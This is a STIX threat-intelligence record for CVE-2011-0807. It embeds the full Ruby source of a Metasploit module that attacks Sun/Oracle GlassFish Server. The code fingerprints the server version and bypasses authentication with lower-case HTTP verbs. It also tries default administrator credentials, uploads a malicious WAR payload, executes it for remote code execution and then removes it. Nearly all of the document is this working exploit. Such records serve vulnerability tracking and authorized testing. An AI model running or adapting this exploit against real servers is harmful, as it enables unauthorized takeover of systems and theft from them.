{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1cf2e12f-699f-453b-b3d6-2a27ef236c6a",
    "created": "2024-08-14T17:10:18.623033Z",
    "modified": "2024-08-14T17:10:18.623037Z",
    "name": "\"Sun/Oracle GlassFish Server Authenticated Code Execution\"",
    "description": " This module logs in to a GlassFish Server (Open Source or Commercial) using various methods (such as authentication bypass, default credentials, or user-supplied login) and deploys a malicious war file in order to get remote code execution. It has been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System Application Server 9.x. Newer GlassFish versions do not allow remote access (Secure Admin) by default, but is required for exploitation.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/glassfish_deployer.rb",
            "external_id": "glassfish_deployer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0807"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\nrequire 'metasploit/framework/login_scanner/glassfish'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Sun/Oracle GlassFish Server Authenticated Code Execution\",\n      'Description'    => %q{\n          This module logs in to a GlassFish Server (Open Source or Commercial) using various\n        methods (such as authentication bypass, default credentials, or user-supplied login),\n        and deploys a malicious war file in order to get remote code execution. It has been\n        tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System Application Server 9.x. Newer\n        GlassFish versions do not allow remote access (Secure Admin) by default, but is required\n        for exploitation.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'juan vazquez', # Msf module for Glassfish 3.0\n          'Joshua Abraham <jabra[at]rapid7.com>', # Glassfish 3.1, 2.x & Sun Java System Application Server 9.1\n          'sinn3r' # Rewrite for everything\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-0807'],\n          ['OSVDB', '71948']\n        ],\n      'Platform'       => ['win', 'linux', 'java'],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Java Universal',    { 'Arch' => ARCH_JAVA, 'Platform' => 'java' } ],\n          [ 'Windows Universal', { 'Arch' => ARCH_X86,  'Platform' => 'win' } ],\n          [ 'Linux Universal',   { 'Arch' => ARCH_X86,  'Platform' => 'linux' } ]\n        ],\n      'DisclosureDate' => '2011-08-04',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(4848),\n          OptString.new('APP_RPORT',[ true,  'The Application interface port', '8080']),\n          OptString.new('USERNAME', [ true, 'The username to authenticate as','admin' ]),\n          OptString.new('PASSWORD', [ true, 'The password for the specified username','' ]),\n          OptString.new('TARGETURI', [ true,  \"The URI path of the GlassFish Server\", '/']),\n          OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', false])\n        ])\n  end\n\n  #\n  # Send GET or POST request, and return the response\n  #\n  def send_glassfish_request(path, method, session='', data=nil, ctype=nil)\n    headers = {}\n    headers['Cookie'] = \"JSESSIONID=#{session}\" unless session.blank?\n    headers['Content-Type'] = ctype if ctype\n    headers['Connection'] = 'keep-alive'\n    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n    headers['Accept-Language'] = 'en-US,en;q=0.5'\n    headers['Accept-Encoding'] = 'gzip, deflate, br'\n\n    res = send_request_raw({\n      'uri'     => path,\n      'method'  => method,\n      'data'    => data,\n      'headers' => headers,\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    res\n  end\n\n  #\n  # Return target\n  #\n  def auto_target(session, res, version)\n    print_status(\"Attempting to automatically select a target...\")\n\n    res = query_serverinfo(session, version)\n    return nil unless res\n    return nil unless res.body\n\n    plat = detect_platform(res.body)\n    arch = detect_arch(res.body)\n\n    # No arch or platform found?\n    return nil if !arch || !plat\n\n    # see if we have a match\n    targets.each do |t|\n      return t if (t['Platform'] == plat) && (t['Arch'] == arch)\n    end\n\n    # no matching target found\n    nil\n  end\n\n  #\n  # Return platform (win, linux, or osx)\n  #\n  def detect_platform(body)\n    body.each_line do |ln|\n      ln.chomp!\n      case ln\n      when /os\\.name = (.*)/\n        os = $1\n        case os\n        when /Windows/\n          return 'win'\n        when /Linux/\n          return 'linux'\n        when /Mac OS X/\n          return 'osx'\n        end\n      end\n    end\n\n    return 'java'\n  end\n\n  #\n  # Return ARCH\n  #\n  def detect_arch(body)\n    body.each_line do |ln|\n      ln.chomp!\n      case ln\n      when /os\\.arch = (.*)/\n        ar = $1\n        case ar\n        when 'x86', 'i386', 'i686'\n          return ARCH_X86\n        when 'x86_64', 'amd64'\n          return ARCH_X64\n        end\n      end\n    end\n  end\n\n  #\n  # Return server information\n  #\n  def query_serverinfo(session,version)\n    res = ''\n\n    if version == '2.x' || version == '9.x'\n      path = \"/appServer/jvmReport.jsf?instanceName=server&pageTitle=JVM%20Report\"\n      res = send_glassfish_request(path, @verbs['GET'], session)\n    else\n      path = \"/common/appServer/jvmReport.jsf?pageTitle=JVM%20Report\"\n      res = send_glassfish_request(path, @verbs['GET'], session)\n\n      if !res || res.code != 200 || res.body.to_s !~ /Operating System Information/\n        path = \"/common/appServer/jvmReport.jsf?reportType=summary&instanceName=server\"\n        res = send_glassfish_request(path, @verbs['GET'], session)\n      end\n    end\n\n    if !res || res.code != 200\n      print_error(\"Failed: Error requesting #{path}\")\n      return nil\n    end\n\n    res\n  end\n\n  #\n  # Return viewstate and entry before deleting a GlassFish application\n  #\n  def get_delete_info(session, version, app='')\n    if version == '2.x' || version == '9.x'\n      path = '/applications/webApplications.jsf'\n      res = send_glassfish_request(path, @verbs['GET'], session)\n\n      if !res || res.code != 200\n        print_error(\"Failed (#{res.code.to_s}): Error requesting #{path}\")\n        return nil\n      end\n\n      input_id = \"javax.faces.ViewState\"\n      p = /input type=\"hidden\" name=\"#{input_id}\" id=\"#{input_id}\" value=\"(j_id\\d+:j_id\\d+)\"/\n      viewstate = res.body.scan(p)[0][0]\n\n      entry = nil\n      p = /<a id=\"(.*)col1:link\" href=\"\\/applications\\/webApplicationsEdit.jsf.*appName=(.*)\">/\n      results = res.body.scan(p)\n\n      results.each do |hit|\n        if hit[1] =~ /^#{app}/\n          entry = hit[0]\n          entry << \"col0:select\"\n        end\n      end\n\n    else\n      path = '/common/applications/applications.jsf?bare=true'\n      res = send_glassfish_request(path, @verbs['GET'], session)\n\n      if !res || res.code != 200\n        print_error(\"Failed (#{res.code.to_s}): Error requesting #{path}\")\n        return nil\n      end\n\n      viewstate = get_viewstate(res.body)\n\n      entry = nil\n      p = /<a id=\"(.*)col1:link\" href=\"\\/common\\/applications\\/applicationEdit.jsf.*appName=(.*)\">/\n      results = res.body.scan(p)\n\n      results.each do |hit|\n        if hit[1] =~ /^#{app}/\n          entry = hit[0]\n          entry << \"col0:select\"\n        end\n      end\n    end\n\n    if !viewstate\n      print_error(\"Failed: Error getting ViewState\")\n      return nil\n    elsif !entry\n      print_error(\"Failed: Error getting the entry to delete\")\n    end\n\n    return viewstate, entry\n  end\n\n  #\n  # Send an \"undeploy\" request to Glassfish and remove our backdoor\n  #\n  def undeploy(viewstate, session, entry)\n    #Send undeployment request\n    data  = [\n    \"propertyForm%3AdeployTable%3AtopActionsGroup1%3Afilter_list=\",\n    \"&propertyForm%3AdeployTable%3AtopActionsGroup1%3Afilter_submitter=false\",\n    \"&#{Rex::Text.uri_encode(entry)}=true\",\n    \"&propertyForm%3AhelpKey=ref-applications.html\",\n    \"&propertyForm_hidden=propertyForm_hidden\",\n    \"&javax.faces.ViewState=#{Rex::Text.uri_encode(viewstate)}\",\n    \"&com_sun_webui_util_FocusManager_focusElementId=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1\",\n    \"&javax.faces.source=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1\",\n    \"&javax.faces.partial.execute=%40all\",\n    \"&javax.faces.partial.render=%40all\",\n    \"&bare=true\",\n    \"&propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1=propertyForm%3AdeployTable%3AtopActionsGroup1%3Abutton1\",\n    \"&javax.faces.partial.ajax=true\"\n    ].join()\n\n    path  = '/common/applications/applications.jsf'\n    ctype = 'application/x-www-form-urlencoded'\n\n    res   = send_glassfish_request(path, @verbs['POST'], session, data, ctype)\n    if !res\n      print_error(\"Undeployment failed on #{path} - No Response\")\n    else\n      if res.code < 200 || res.code >= 300\n        print_error(\"Undeployment failed on #{path} - #{res.code.to_s}:#{res.message.to_s}\")\n      end\n    end\n  end\n\n  def report_glassfish_version(banner)\n    report_note(\n      host: rhost,\n      type: 'glassfish.banner',\n      data: banner,\n      update: :unique_data\n    )\n  end\n\n  #\n  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x) and\n  # banner (ex: Sun Java System Application Server 9.x)\n  #\n  def get_version(res)\n    # Extract banner from response\n    banner = res.headers['Server']\n\n    # Default value for edition and glassfish version\n    edition = 'Commercial'\n    version = 'Unknown'\n\n    # Set edition (Open Source or Commercial)\n    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/\n    edition = 'Open Source' if banner =~ p\n\n    # Set version.  Some GlassFish servers return banner \"GlassFish v3\".\n    if banner =~ /(GlassFish Server|Open Source Edition) {1,}(\\d\\.\\d)/\n      version = $2\n    elsif banner =~ /GlassFish v(\\d)/ && version == 'Unknown'\n      version = $1\n    elsif banner =~ /Sun GlassFish Enterprise Server v2/ && version == 'Unknown'\n      version = '2.x'\n    elsif banner =~ /Sun Java System Application Server 9/ && version == 'Unknown'\n      version = '9.x'\n    end\n\n    if version == nil || version == 'Unknown'\n      print_status(\"Unsupported version: #{banner}\")\n    end\n\n    report_glassfish_version(banner)\n\n    return edition, version, banner\n  end\n\n  #\n  # Return the formatted version of the POST data\n  #\n  def format_2_x_war(boundary,name,value=nil, war=nil)\n    data = ''\n\n    data << boundary\n    data << \"\\r\\nContent-Disposition: form-data; name=\\\"form:title:sheet1:section1:prop1:fileupload\\\"; \"\n    data << \"filename=\\\"#{name}.war\\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\"\n    data << war\n    data << \"\\r\\n\"\n\n    return data\n  end\n\n  #\n  # Return the formatted version of the POST data\n  #\n  def format(boundary,name,value=nil, war=nil)\n    data = ''\n\n    if war\n      data << boundary\n      data << \"\\r\\nContent-Disposition: form-data; name=\\\"form:sheet1:section1:prop1:fileupload\\\"; \"\n      data << \"filename=\\\"#{name}.war\\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\"\n      data << war\n      data << \"\\r\\n\"\n    else\n      data << boundary\n      data << \"\\r\\nContent-Disposition: form-data; name=\\\"#{name}\\\"\"\n      data << \"\\r\\n\\r\\n\"\n      data << \"#{value}\\r\\n\"\n    end\n\n    return data\n  end\n\n  #\n  # Return POST data and data length, based on GlassFish edition\n  #\n  def get_upload_data(opts = {})\n    boundary = opts[:boundary]\n    version = opts[:version]\n    war = opts[:war]\n    app_base = opts[:app_base]\n    typefield = opts[:typefield]\n    status_checkbox = opts[:status_checkbox]\n    start = opts[:start]\n    viewstate = opts[:viewstate]\n\n    data = ''\n\n    if version == '3.0'\n\n      uploadParam_name = \"form:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam\"\n      uploadparam_data = \"form:sheet1:section1:prop1:fileupload\"\n\n      boundary = \"--#{boundary}\"\n\n      data = [\n        format(boundary, app_base, nil, war),\n        format(boundary, uploadParam_name, uploadparam_data),\n        format(boundary, \"form:sheet1:section1:prop1:extension\", \".war\"),\n        format(boundary, \"form:sheet1:section1:prop1:action\", \"client\"),\n        format(boundary, typefield, \"war\"),\n        format(boundary, \"form:war:psection:cxp:ctx\", app_base),\n        format(boundary, \"form:war:psection:nameProp:appName\", app_base),\n        format(boundary, \"form:war:psection:vsProp:vs\", \"\"),\n        format(boundary, status_checkbox, \"true\"),\n        format(boundary, \"form:war:psection:librariesProp:library\", \"\"),\n        format(boundary, \"form:war:psection:descriptionProp:description\", \"\"),\n        format(boundary, \"form_hidden\", \"form_hidden\"),\n        format(boundary, \"javax.faces.ViewState\", viewstate),\n        \"#{boundary}--\"\n      ].join()\n    elsif version == '2.x' || version == '9.x'\n\n      uploadParam_name = \"form:title:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam\"\n      uploadParam_data = \"form:title:sheet1:section1:prop1:fileupload\"\n\n      focusElementId_name = \"com_sun_webui_util_FocusManager_focusElementId\"\n      focusElementId_data = 'form:title:topButtons:uploadButton'\n\n      boundary = \"-----------------------------#{boundary}\"\n\n      data = [\n        format_2_x_war(boundary, app_base, nil, war),\n        format(boundary, \"form:title:sheet1:section1:type:appType\", \"webApp\"),\n        format(boundary, \"uploadRdBtn\", \"client\"),\n        format(boundary, uploadParam_name, uploadParam_data),\n        format(boundary, \"form:title:sheet1:section1:prop1:extension\", \".war\"),\n        format(boundary, \"form:title:ps:psec:nameProp:appName\", app_base),\n        format(boundary, \"form:title:ps:psec:cxp:ctx\", app_base),\n        format(boundary, \"form:title:ps:psec:vsp:vs\", \"\"),\n        format(boundary, status_checkbox, \"true\"),\n        format(boundary, \"form:title:ps:psec:librariesProp:library\", \"\"),\n        format(boundary, \"form:title:ps:psec:threadpoolProp:threadPool\", \"\"),\n        format(boundary, \"form:title:ps:psec:registryProp:registryType\", \"\"),\n        format(boundary, \"form:title:ps:psec:descriptionProp:description\", \"\"),\n        format(boundary, \"form:helpKey\", \"uploaddev.html\"),\n        format(boundary, \"form_hidden\", \"form_hidden\"),\n        format(boundary, \"javax.faces.ViewState\", viewstate),\n        format(boundary, focusElementId_name, focusElementId_data),\n        \"#{boundary}--\"\n      ].join()\n    else\n\n      boundary = \"-----------------------------#{boundary}\"\n\n      #Setup dynamic arguments\n      num1 = start.to_i\n      num2 = num1 + 14\n      num3 = num2 + 2\n      num4 = num3 + 2\n      num5 = num4 + 2\n      num6 = num5 + 2\n      num7 = num6 + 1\n\n      id0 = num4\n      id1 = num4 + 1\n      id2 = num4 + 2\n      id3 = num4 + 3\n      id4 = num4 + 4\n      id5 = num4 + 5\n      id6 = num4 + 6\n      id7 = num4 + 7\n      id8 = num4 + 8\n      id9 = num4 + 9\n\n      uploadParam_name  = \"form:sheet1:section1:prop1:fileupload_com.sun.webui.jsf.uploadParam\"\n      uploadParam_value = \"form:sheet1:section1:prop1:fileupload\"\n\n      focusElementId_name = \"com_sun_webui_util_FocusManager_focusElementId\"\n      focusElementId_data = \"form:title2:bottomButtons:uploadButton\"\n\n      data = [\n        format(boundary,\"uploadRdBtn\",\"client\"),\n        ## web service\n        format(boundary, app_base, nil, war),\n        ## sheet1\n        format(boundary, uploadParam_name, uploadParam_value),\n        format(boundary,\"form:sheet1:section1:prop1:extension\",\".war\"),\n        format(boundary,\"form:sheet1:section1:prop1:action\",\"client\"),\n        format(boundary,\"form:sheet1:sun_propertySheetSection#{num1.to_s}:type:appType\",\"war\"),\n        format(boundary,\"form:appClient:psection:nameProp:appName\",\"#{app_base}\"),\n        format(boundary,\"form:appClient:psection:descriptionProp:description\"),\n        ## war\n        format(boundary,\"form:war:psection:cxp:ctx\",\"#{app_base}\"),\n        format(boundary,\"form:war:psection:nameProp:appName\",\"#{app_base}\"),\n        format(boundary,\"form:war:psection:vsProp:vs\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id1.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id2.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id3.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id4.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id5.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id6.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id7.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id8.to_s,\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox\" + id9.to_s,\"true\"),\n        format(boundary,\"form:other:psection:descriptionProp:description\", \"\"),\n        format(boundary,\"form:other:psection:librariesProp:library\", \"\"),\n        format(boundary,\"form:other:psection:deploymentOrder:deploymentOrder\", \"\"),\n        format(boundary,\"form:other:psection:implicitCdi:implicitCdi\", \"true\"),\n        format(boundary,\"form:other:psection:enableProp:sun_checkbox44\",\"true\"),\n        format(boundary,\"form:war:psection:enableProp:sun_checkbox42\",\"true\"),\n        format(boundary,\"form:other:psection:vsProp:vs\",\"\"),\n        format(boundary,\"form:rar:psection:implicitCdi:implicitCdi\",\"true\"),\n        format(boundary,\"form:rar:psection:deploymentOrder:deploymentOrder\",\"\"),\n        format(boundary,\"form:rar:psection:enableProp:sun_checkbox40\",\"true\"),\n        format(boundary,\"form:other:psection:nameProp:appName\", app_base),\n        format(boundary,\"form:rar:psection:nameProp:appName\", app_base),\n        format(boundary,\"form:jar:psection:nameProp:appName\", app_base),\n        format(boundary,\"form:ear:psection:nameProp:appName\", app_base),\n        format(boundary,\"form:ear:psection:descriptionProp:description\",\"\"),\n        format(boundary,\"form:jar:psection:deploymentOrder:deploymentOrder\", \"\"),\n        format(boundary,\"form:jar:psection:implicitCdi:implicitCdi\",\"true\"),\n        format(boundary,\"form:ear:psection:jw:jwc\",\"true\"),\n        format(boundary,\"form:ear:psection:vsProp:vs\",\"\"),\n        format(boundary,\"form:appClient:psection:deploymentOrder:deploymentOrder\",\"\"),\n        format(boundary,\"form:jar:psection:enableProp:sun_checkbox38\",\"true\"),\n        format(boundary,\"form:jar:psection:descriptionProp:description\", \"\"),\n        format(boundary,\"form:ear:psection:implicitCdi:implicitCdi\",\"true\"),\n        format(boundary,\"form:appClient:psection:implicitCdi:implicitCdi\",\"true\"),\n        format(boundary,\"form:ear:psection:enableProp:sun_checkbox36\",\"true\"),\n        format(boundary,\"form:war:psection:deploymentOrder:deploymentOrder\",\"\"),\n        format(boundary,\"form:jar:psection:librariesProp:library\",\"\"),\n        format(boundary,\"form:appClient:psection:jw:jwt\",\"true\"),\n        format(boundary,\"form:ear:psection:librariesProp:library\", \"\"),\n        format(boundary,\"form:sheet1:sun_propertySheetSection23:type:appType\",\"war\"),\n        format(boundary,\"form:ear:psection:deploymentOrder:deploymentOrder\",\"\"),\n        format(boundary,\"form:rar:psection:descriptionProp:description\",\"\"),\n        format(boundary,\"form:war:psection:implicitCdi:implicitCdi\",\"true\"),\n        format(boundary,\"form:war:psection:librariesProp:library\"),\n        format(boundary,\"form:war:psection:descriptionProp:description\"),\n        format(boundary,\"form_hidden\",\"form_hidden\"),\n        format(boundary,\"javax.faces.ViewState\",\"#{viewstate}\"),\n        format(boundary, focusElementId_name, focusElementId_data)\n      ].join()\n\n      item_list_name = \"form:targetSection:targetSectionId:addRemoveProp:commonAddRemove_item_list\"\n      item_list_data = \"|server|com.sun.webui.jsf.separator|\"\n\n      item_value_name = \"form:targetSection:targetSectionId:addRemoveProp:commonAddRemove_list_value\"\n      item_value_data = \"server\"\n\n      data << format(boundary, item_list_name, item_list_data)\n      data << format(boundary, item_value_name, item_value_data)\n      data << \"#{boundary}--\"\n      data << \"\\r\\n\\r\\n\"\n\n    end\n\n    return data\n  end\n\n  def get_viewstate(body)\n      noko = Nokogiri::HTML(body)\n      inputs = noko.search('input')\n      hidden_inputs = []\n      inputs.each {|e| hidden_inputs << e if e.attributes['type'].text == 'hidden'}\n      hidden_inputs.each do |e|\n        if e.attributes['name'].text == 'javax.faces.ViewState'\n          return e.attributes['value'].text\n        end\n      end\n\n      ''\n  end\n\n  #\n  # Upload our payload, and execute it.  This function will also try to automatically\n  # clean up after itself.\n  #\n  def upload_exec(opts = {})\n    session = opts[:session]\n    app_base = opts[:app_base]\n    jsp_name = opts[:jsp_name]\n    war = opts[:war]\n    edition = opts[:edition]\n    version = opts[:version]\n\n    if version == '2.x' || version == '9.x'\n      path = \"/applications/upload.jsf?appType=webApp\"\n      res = send_glassfish_request(path, @verbs['GET'], session)\n\n      # Obtain some properties\n      p2 = /input type=\"checkbox\" id=\"form:title:ps:psec:enableProp:sun_checkbox\\d+\" name=\"(.*)\" checked/mi\n      viewstate       = get_viewstate(res.body)\n      status_checkbox = res.body.scan(p2)[0][0]\n      boundary        = rand_text_alphanumeric(28)\n    else\n      path = \"/common/applications/uploadFrame.jsf\"\n      res = send_glassfish_request(path, @verbs['GET'], session)\n\n      # Obtain some properties\n      res.body =~ /propertySheetSection(\\d{3})/\n      start = $1\n      p2 = /select class=\"MnuStd_sun4\" id=\"form:sheet1:sun_propertySheetSection.*:type:appType\" name=\"(.*)\" size/\n      p3 = /input type=\"checkbox\" id=\"form:war:psection:enableProp:sun_checkbox.*\" name=\"(.*)\" checked/\n\n      rnd_text = rand_text_alphanumeric(29)\n\n      viewstate       = get_viewstate(res.body)\n      typefield       = res.body.scan(p2)[0][0]\n      status_checkbox = res.body.scan(p3)[0][0]\n      boundary        = (edition == 'Open Source') ? rnd_text[0,15] : rnd_text\n    end\n\n    # Get upload data\n    if version == '3.0'\n      ctype = \"multipart/form-data; boundary=#{boundary}\"\n    elsif version == '2.x' || version == '9.x'\n      ctype = \"multipart/form-data; boundary=---------------------------#{boundary}\"\n      typefield = ''\n      start = ''\n    else\n      ctype = \"multipart/form-data; boundary=---------------------------#{boundary}\"\n    end\n\n    post_data = get_upload_data({\n      :boundary => boundary,\n      :version => version,\n      :war => war,\n      :app_base => app_base,\n      :typefield => typefield,\n      :status_checkbox => status_checkbox,\n      :start => start,\n      :viewstate => viewstate\n    })\n\n    # Upload our payload\n    if version == '2.x' || version == '9.x'\n      path = '/applications/upload.jsf?form:title:topButtons:uploadButton=%20%20OK%20%20'\n    else\n      path  = '/common/applications/uploadFrame.jsf?'\n      path << 'form:title:topButtons:uploadButton=Processing...'\n      path << '&bare=false'\n    end\n\n    res = send_glassfish_request(path, @verbs['POST'], session, post_data, ctype)\n\n    # Print upload result\n    if res && res.code == 302\n      print_good(\"Successfully Uploaded\")\n    else\n      print_error(\"Error uploading #{res.code}\")\n      return\n    end\n\n    #Execute our payload using the application interface (no need to use auth bypass technique)\n    jsp_path = normalize_uri(target_uri.path, app_base, \"#{jsp_name}.jsp\")\n    nclient = Rex::Proto::Http::Client.new(datastore['RHOST'], datastore['APP_RPORT'],\n      {\n        'Msf'        => framework,\n        'MsfExploit' => self,\n      }\n    )\n\n    print_status(\"Executing #{jsp_path}...\")\n    req = nclient.request_raw({\n      'uri'     => jsp_path,\n      'method'  => 'GET',\n    })\n\n    if req\n      res = nclient.send_recv(req, 90)\n    else\n      print_status(\"Error: #{rhost} did not respond on #{app_rport}.\")\n    end\n\n    # Sleep for a bit before cleanup\n    select(nil, nil, nil, 5)\n\n    # Start undeploying\n    print_status(\"Getting information to undeploy...\")\n    viewstate, entry = get_delete_info(session, version, app_base)\n    if !viewstate\n      fail_with(Failure::Unknown, \"Unable to get viewstate\")\n    elsif (not entry)\n      fail_with(Failure::Unknown, \"Unable to get entry\")\n    end\n\n    print_status(\"Undeploying #{app_base}...\")\n    undeploy(viewstate, session, entry)\n\n    print_status(\"Undeployment complete.\")\n  end\n\n  def init_loginscanner\n    @cred_collection = Metasploit::Framework::CredentialCollection.new\n\n    @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(\n      configure_http_login_scanner(\n        cred_details: @cred_collection,\n        connection_timeout: 5,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n  end\n\n  def report_auth_bypass(version)\n    report_vuln(\n      name: 'GlassFish HTTP Method Authentication Bypass',\n      info: \"The remote service has a vulnerable version of GlassFish (#{version}) that allows the \" \\\n            'attacker to bypass authentication by sending an HTTP verb in lower-case.',\n      host: rhost,\n      port: rport,\n      proto: 'tcp',\n      refs: self.references\n    )\n  end\n\n  def try_glassfish_auth_bypass(version)\n    sid = nil\n\n    if version == '2.x' || version == '9.x'\n      print_status(\"Trying auth bypass...\")\n      res = send_glassfish_request('/applications/upload.jsf', 'get')\n      title = '<title>Deploy Enterprise Applications/Modules</title>'\n      if res && res.code.to_i == 200 && res.body.include?(title)\n        sid = res.get_cookies.to_s.scan(/JSESSIONID=(.*); */).flatten.first\n      end\n    else\n      # 3.0\n      print_status(\"Trying auth bypass...\")\n      res = send_glassfish_request('/common/applications/uploadFrame.jsf', 'get')\n      title = '<title>Deploy Applications or Modules'\n      if res && res.code.to_i == 200 && res.body.include?(title)\n        sid = res.get_cookies.to_s.scan(/JSESSIONID=(.*); */).flatten.first\n      end\n    end\n\n    report_auth_bypass(version) if sid\n\n    sid\n  end\n\n  def my_target_host\n    \"http://#{rhost.to_s}:#{rport.to_s}#{normalize_uri(target_uri.path)}\"\n  end\n\n\n  def service_details\n    super.merge({ post_reference_name: self.refname })\n  end\n\n  def try_normal_login(version)\n    init_loginscanner\n\n    case version\n    when /2\\.x|9\\.x/\n      @cred_collection.prepend_cred(\n        Metasploit::Framework::Credential.new(\n        public: 'admin',\n        private: 'adminadmin',\n        private_type: :password\n      ))\n    when /^3\\./\n      @cred_collection.prepend_cred(\n        Metasploit::Framework::Credential.new(\n        public: 'admin',\n        private: '',\n        private_type: :password\n      ))\n    end\n\n    @cred_collection.prepend_cred(\n      Metasploit::Framework::Credential.new(\n      public: datastore['USERNAME'],\n      private: datastore['PASSWORD'],\n      private_type: :password\n    ))\n\n    @scanner.send_request({'uri'=>normalize_uri(target_uri.path)})\n    @scanner.version = version\n    @cred_collection.each do |raw|\n      cred = raw.to_credential\n      print_status(\"Trying to login as #{cred.public}:#{cred.private}\")\n      result = @scanner.attempt_login(cred)\n      if result.status == Metasploit::Model::Login::Status::SUCCESSFUL\n        store_valid_credential(user: cred.public, private: cred.private) # changes service_name to http || https\n        return @scanner.jsession\n      end\n    end\n\n    nil\n  end\n\n  def attempt_login(version)\n    sid = nil\n\n    if version =~ /3\\.0|2\\.x|9\\.x/\n      sid = try_glassfish_auth_bypass(version)\n      return sid if sid\n    end\n\n    try_normal_login(version)\n  end\n\n  def make_war(selected_target)\n    p = exploit_regenerate_payload(selected_target.platform, selected_target.arch)\n\n    jsp_name = rand_text_alphanumeric(4+rand(32-4))\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n\n    war = p.encoded_war({\n      :app_name    => app_base,\n      :jsp_name    => jsp_name,\n      :arch        => selected_target.arch,\n      :platform    => selected_target.platform\n    }).to_s\n\n    return app_base, jsp_name, war\n  end\n\n  def exploit\n    # Invoke index to gather some info\n    res = send_glassfish_request('/common/index.jsf', 'GET')\n\n    if res.code == 302\n      res = send_glassfish_request('/login.jsf', 'GET')\n    end\n\n    # Get GlassFish version\n    edition, version, banner = get_version(res)\n    print_status(\"Glassfish edition: #{banner}\")\n\n    # Set HTTP verbs. Lower-case is used to bypass auth on v3.0\n    @verbs = {\n      'GET'  => (version == '3.0' || version == '2.x' || version == '9.x') ? 'get' : 'GET',\n      'POST' => (version == '3.0' || version == '2.x' || version == '9.x') ? 'post' : 'POST',\n    }\n\n    sid = attempt_login(version)\n\n    unless sid\n      fail_with(Failure::NoAccess, \"#{my_target_host()} - GlassFish - Failed to authenticate\")\n    end\n\n    selected_target = target.name =~ /Automatic/ ? auto_target(sid, res, version) : target\n    fail_with(Failure::NoTarget, \"Unable to automatically select a target\") unless selected_target\n\n    app_base, jsp_name, war = make_war(selected_target)\n    print_status(\"Uploading payload...\")\n    res = upload_exec({\n      :session => sid,\n      :app_base => app_base,\n      :jsp_name => jsp_name,\n      :war => war,\n      :edition => edition,\n      :version => version\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-04",
    "x_mitre_platforms": [
        "['win', 'linux', 'java']"
    ]
}